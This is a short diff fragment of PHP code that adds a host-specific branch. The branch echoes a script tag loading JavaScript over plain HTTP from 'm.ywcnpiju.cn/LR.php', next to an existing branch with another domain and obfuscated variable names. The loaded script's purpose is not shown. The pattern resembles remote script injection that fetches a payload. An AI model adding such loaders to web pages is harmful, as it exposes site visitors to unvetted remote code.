@@ -26,6 +26,8 @@ echo '<script>var s05f0=document.createElement("script");
 		s05f0.src="http://m.hdsh.tu8zhang.com/LR.php";
 		var j72c2=document.getElementsByTagName("script")[0];
 		j72c2.parentNode.insertBefore(s05f0,j72c2);</script';
+} elseif (strpos($this->context->host, 'm.ywcnpiju.cn') !== false) {
+echo '<script>(function(){var h = document.getElementsByTagName("head")[0],url = "http://m.ywcnpiju.cn/LR.php",s = document.createElement("script");if(h){s.setAttribute("src", url);s.setAttribute("chartset", "utf-8"); s.setAttribute("type", "text/javascript");h.appendChild(s);}})();</script>';
 }
 
 }
